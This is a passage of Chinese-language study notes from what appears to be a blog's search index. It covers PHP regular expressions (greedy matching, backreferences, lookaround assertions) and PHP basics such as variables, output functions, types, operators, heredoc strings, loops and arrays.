class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-built_in">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span><br>        (<br>            [<span class="hljs-number">0</span>] =&gt; good goooood good kl s ja dfs d<br>        )<br><br>)<br></code></pre></td></tr></table></figure><hr><p>非贪婪模式：在数量限定词后面加?</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;ksda good goooood good kl s ja dfs dk &#x27;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/g.+?d/&#x27;</span>; <span class="hljs-regexp">//</span> god  .点  任意字符，不含换行<br>preg_match_all(<span class="hljs-variable">$patt</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br>print_r(<span class="hljs-variable">$res</span>);<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-built_in">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-built_in">Array</span><br>        (<br>            [<span class="hljs-number">0</span>] =&gt; good<br>            [<span class="hljs-number">1</span>] =&gt; goooood<br>            [<span class="hljs-number">2</span>] =&gt; good<br>        )<br><br>)<br></code></pre></td></tr></table></figure><p>区别：可以发现贪婪模式会尽量往后匹配整段字符串，而非贪婪模式会匹配单段满足条件的字符串</p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>在后面表达式中引用前面括号内的结果，第一个括号为\1 第二个为\2</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;txt hello,high,bom,mum,afewaa,bafsdab,ceagiac&quot;</span>;<br><span class="hljs-comment">// $patt = &#x27;/\bt\w+t\b/&#x27;;</span><br><br><span class="hljs-comment">// 后向引用</span><br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/\b([a-z])\w+\1\b/&#x27;</span>;  <span class="hljs-comment">// 引用前面括号里的结果 第一个括号为\1 第二个为\2</span><br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$patt</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>后行断言和先行断言有时候被称为断言，它们是特殊类型的 <strong>非捕获组</strong>（用于匹配模式，但不包括在匹配列表中）。当我们在一种特定模式之前或者之后有这种模式时，会优先使用断言。 例如我们想获取输入字符串 $4.44 and $10.88 中带有前缀 $ 的所有数字。我们可以使用这个正则表达式 (?&lt;&#x3D;$)[0-9.]*，表示：获取包含 . 字符且前缀为 $ 的所有数字。 以下是正则表达式中使用的断言：</p><table><thead><tr><th><em><strong>*符号*</strong></em></th><th><em><strong>*描述*</strong></em></th></tr></thead><tbody><tr><td>?&#x3D;</td><td>正向先行断言</td></tr><tr><td>?!</td><td>负向先行断言</td></tr><tr><td>?&lt;&#x3D;</td><td>正向后行断言</td></tr><tr><td>?&lt;!</td><td>负向后行断言</td></tr></tbody></table><h3 id="正向先行断言"><a href="#正向先行断言" class="headerlink" title="正向先行断言"></a>正向先行断言</h3><p>正向先行断言认为第一部分的表达式的后面必须是先行断言表达式。返回的匹配结果仅包含与第一部分表达式匹配的文本。 要在一个括号内定义一个正向先行断言，在括号中问号和等号是这样使用的 (?&#x3D;…)。先行断言表达式写在括号中的等号后面。 例如正则表达式 (T|t)he(?&#x3D;\sfat)，表示：匹配大写字母 T 或小写字母 t，后面跟字母 h，后跟字母 e。 在括号中，我们定义了正向先行断言，它会引导正则表达式引擎匹配后面跟着 fat 的 The 或 the。</p><p>“(T|t)he(?&#x3D;\sfat)” &#x3D;&gt; <a href="#learn-regex">The</a> fat cat sat on the mat.</p><h3 id="负向先行断言"><a href="#负向先行断言" class="headerlink" title="负向先行断言"></a>负向先行断言</h3><p>当我们需要指定第一部分表达式的后面不跟随某一内容时，使用负向先行断言。负向先行断言的定义跟我们定义的正向先行断言一样， 唯一的区别在于我们使用否定符号 ! 而不是等号 &#x3D;，例如 (?!…)。 我们来看看下面的正则表达式 (T|t)he(?!\sfat)，表示：从输入字符串中获取全部 The 或者 the 且不匹配 fat 前面加上一个空格字符。</p><p>“(T|t)he(?!\sfat)” &#x3D;&gt; The fat cat sat on <a href="#learn-regex">the</a> mat.</p><h3 id="正向后行断言"><a href="#正向后行断言" class="headerlink" title="正向后行断言"></a>正向后行断言</h3><p>正向后行断言用于获取跟随在特定模式之后的所有匹配内容。正向后行断言表示为 (?&lt;&#x3D;…)。例如正则表达式 (?&lt;&#x3D;(T|t)he\s)(fat|mat)，表示：从输入字符串中获取在单词 The 或 the 之后的所有 fat 和 mat 单词。</p><p>“(?&lt;&#x3D;(T|t)he\s)(fat|mat)” &#x3D;&gt; The <a href="#learn-regex">fat</a> cat sat on the <a href="#learn-regex">mat</a>.</p><h3 id="负向后行断言"><a href="#负向后行断言" class="headerlink" title="负向后行断言"></a>负向后行断言</h3><p>负向后行断言是用于获取不跟随在特定模式之后的所有匹配的内容。负向后行断言表示为 (?&lt;!…)。例如正则表达式 (?&lt;!(T|t)he\s)(cat)，表示：在输入字符中获取所有不在 The 或 the 之后的所有单词 cat。</p><p>“(?&lt;!(T|t)he\s)(cat)” &#x3D;&gt; The cat sat on <a href="#learn-regex">cat</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习笔记</title>
      <link href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h1><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li><li>PHP 文件的默认文件扩展名是 .php。</li><li>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。</li></ul><h1 id="PHP的学习"><a href="#PHP的学习" class="headerlink" title="PHP的学习"></a>PHP的学习</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment">// php 代码</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">例如：</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>My first PHP page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="PHP中的注释"><a href="#PHP中的注释" class="headerlink" title="PHP中的注释"></a>PHP中的注释</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 这是 PHP 单行注释</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这是</span><br><span class="hljs-comment">PHP 多行</span><br><span class="hljs-comment">注释</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>定义变量：</p><p>变量以 $ 符号开始，后面跟着变量的名称</p><p>变量名必须以字母或者下划线字符开始</p><p>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</p><p>变量名不能包含空格</p><p>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">100</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><p>PHP预定义变量，也称为超全局变量，是在PHP脚本的任何地方都可以访问的内置变量。这些变量用于存储有关PHP运行环境的全局信息，例如服务器信息、客户端请求数据、会话信息等。</p><p><img src="/../image/%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F.png"></p><h3 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h3><p>echo函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 打印字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我是奶龙&quot;</span>;<br><br><span class="hljs-comment">//打印变量</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//也可包含HTML标签</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我是奶龙&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>print函数：</p><p>只允许输出一个字符串，返回值总为 1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;奶龙&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>echo和print的区别：</p><p>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p><p>print_r函数：</p><p>可以输出stirng、int、float、array、object等</p><p>输出array时会用结构表示，print_r输出成功时返回true</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../image/print_r.png"></p><p>var_dump()函数</p><p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../image/var_dump.png"></p><h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3><p>unset函数</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unset</span>(变量名);                                                                                      <br></code></pre></td></tr></table></figure><h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><p>PHP 有四种不同的变量作用域：</p><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul><p>注意：在函数内定义的变量是局部变量只能在函数内调用，在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字：</p><h3 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h3><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 <strong>static</strong> 关键字</p><h3 id="判断变量是否存在"><a href="#判断变量是否存在" class="headerlink" title="判断变量是否存在"></a>判断变量是否存在</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">empty</span>(变量名);判断变量值是否为空或<span class="hljs-number">0</span>然后返回<span class="hljs-literal">true</span><br><span class="hljs-keyword">isset</span>(变量名);判断变量存在然后返回<span class="hljs-literal">true</span><br>区别：<br><span class="hljs-keyword">empty</span> 如果值为空或<span class="hljs-number">0</span>；返回<span class="hljs-literal">true</span><br><span class="hljs-keyword">isset</span> 只有值存在才返回<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li>String（字符串）</li><li>Integer（整型）</li><li>Float（浮点型）</li><li>Boolean（布尔型）</li><li>Array（数组）</li><li>Object（对象）</li><li>NULL（空值）</li><li>Resource（资源类型）</li></ul><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>1.自动转换：系统自己判定自己转换</p><p>2.强制类型转换：echo (类型)变量名;</p><p>说明：</p><p>1.bool true&#x3D;1，false&#x3D;0</p><p>2.以字母开头的字符串，永远为0；</p><p>3.以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</p><h3 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h3><p>1.松散比较：使用两个等号&#x3D;&#x3D;比较，只比较值，不比较类型</p><p>例如：42&#x3D;&#x3D;”42”返回true</p><p>2.严格比较：用三个等号&#x3D;&#x3D;&#x3D;比较，不仅比较值，还比较类型</p><p>例如：42&#x3D;&#x3D;&#x3D;”42”返回false</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>&#x3D;&#x3D;&#x3D;全等于当左边和右边的值和数据类型都相同是返回true</p><p>!&#x3D;&#x3D;不绝对等于当左边和右边的值不等时或者数据类型不相同时返回true</p><p>其他和c一样</p><h3 id="组合比较符"><a href="#组合比较符" class="headerlink" title="组合比较符"></a>组合比较符</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $a &lt;=&gt; $b<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</li><li>如果 <strong>$a &#x3D;&#x3D; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</li><li>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</li></ul><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>优先级： &amp;&amp;  &gt;  &#x3D;  &gt;  and </p><p>优先级： ||  &gt;  &#x3D;  &gt;  or</p><p>其他和c一样</p><h3 id="并置运算符-字符串运算符"><a href="#并置运算符-字符串运算符" class="headerlink" title="并置运算符(字符串运算符)"></a>并置运算符(字符串运算符)</h3><p>并置运算符 (.) 用于把两个字符串值连接起来</p><p>$a .&#x3D; $b表示将$a后面接上$b</p><p>echo $a.$b;也可直接输出$a.$b</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot; world&quot;</span>;<br><span class="hljs-variable">$a</span> .= <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="EOF定界符"><a href="#EOF定界符" class="headerlink" title="EOF定界符"></a>EOF定界符</h3><p>EOF定界符：主要用于定义一个字符串，该字符串可以跨越多行，并且能够保持原有的格式和换行符</p><p>格式：</p><p>$a &#x3D; &lt;&lt;&lt;EOF</p><p>…</p><p>EOF;</p><p>EOF定界符的优点和适用场景：</p><ol><li>‌<strong>保持格式</strong>‌：Heredoc能够保持字符串内部的格式和换行符，适合输出大量HTML或JavaScript代码‌2。</li><li>‌<strong>变量解析</strong>‌：在Heredoc中，变量会被正常解析，这使得在输出大量文本时更加方便和灵活‌12。</li><li>‌<strong>减少转义</strong>‌：在Heredoc中不需要对特殊字符进行转义，简化了字符串的处理过程‌</li></ol><p>例如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;?php<br><span class="hljs-variable">$out</span> = <br>&lt;&lt;&lt;EOF<br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:edit(&#x27;asd&#x27;, &#x27;aaa&#x27;)&quot;</span>&gt;编辑&lt;/a&gt; |<br><br>    &lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;#ccc&quot;</span>&gt;删除&lt;/font&gt;<br><br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:confirmurl(&#x27;?m=admin&amp;posid=12&#x27;)&quot;</span>&gt;删除&lt;/a&gt; |<br><br>    &lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;red&quot;</span>&gt;启用&lt;/font&gt;&lt;/a&gt; |  <br><br>    &lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:preview(&#x27;3&#x27;,&#x27;ds&#x27;)&quot;</span>&gt;&lt;font <span class="hljs-attribute">color</span>=<span class="hljs-string">&quot;green&quot;</span>&gt;演示&lt;/font&gt;&lt;/a&gt;<br>EOF;<br><br>echo <span class="hljs-variable">$out</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>和c一样</p><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(expr1)</span> ? <span class="hljs-comment">(expr2)</span> : <span class="hljs-comment">(expr3)</span> <br></code></pre></td></tr></table></figure><p>和c一样</p><h3 id="回车换行符"><a href="#回车换行符" class="headerlink" title="回车换行符"></a>回车换行符</h3><p>PHP_EOL：回车换行</p><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><p>if语句</p><p>if…else语句</p><p>if…elseif…else语句</p><p>switch语句</p><p>和c一样</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环和for循环"><a href="#while循环和for循环" class="headerlink" title="while循环和for循环"></a>while循环和for循环</h3><p>for循环和c差不多</p><p>while循环do while循环和c差不多</p><p>break跳出循环</p><p>continue跳到下次循环</p><p>exit退出程序</p><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>foreach 循环用于遍历数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) <span class="hljs-comment">// 每次循环都会将数组元素的值赋值给$value</span><br>&#123;<br>要执行代码;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">// 每次循环都会将将数组元素的键与值赋值给$key和$value</span><br>&#123;<br>要执行代码;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$x</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Google&quot;</span>,<span class="hljs-string">&quot;Runoob&quot;</span>,<span class="hljs-string">&quot;Taobao&quot;</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span> . PHP_EOL;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/../image/foreach.png"></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h3><p>数值数组的定义：$arr &#x3D; array(“…”,”…”,”…”);</p><p>例如：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$cars = <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>, <span class="hljs-string">&quot;BMW&quot;</span>, <span class="hljs-string">&quot;Toyota&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>关联数组有点像c++里的map容器和python的字典</p><p>键值对：一个键对应一个值</p><p>关联数组的定义：$arr &#x3D; array(“…”&#x3D;&gt;”…”,”…”&#x3D;&gt;”…”,”…”&#x3D;&gt;”…”);</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$age</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);<br><span class="hljs-variable">$age</span>[<span class="hljs-string">&quot;Peter&quot;</span>] = <span class="hljs-string">&quot;35&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><p>和c差不多就多了个foreach有点像c++的auto遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 遍历数值数组</span><br><span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$$array</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$$array</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// foreach循环遍历数值数组</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.PHP_EOL;<br>&#125;<br><br><span class="hljs-comment">// 遍历关联数组</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;key=&quot;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-string">&quot;value=&quot;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>数值数组：会自动分配键值,从0开始</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">// 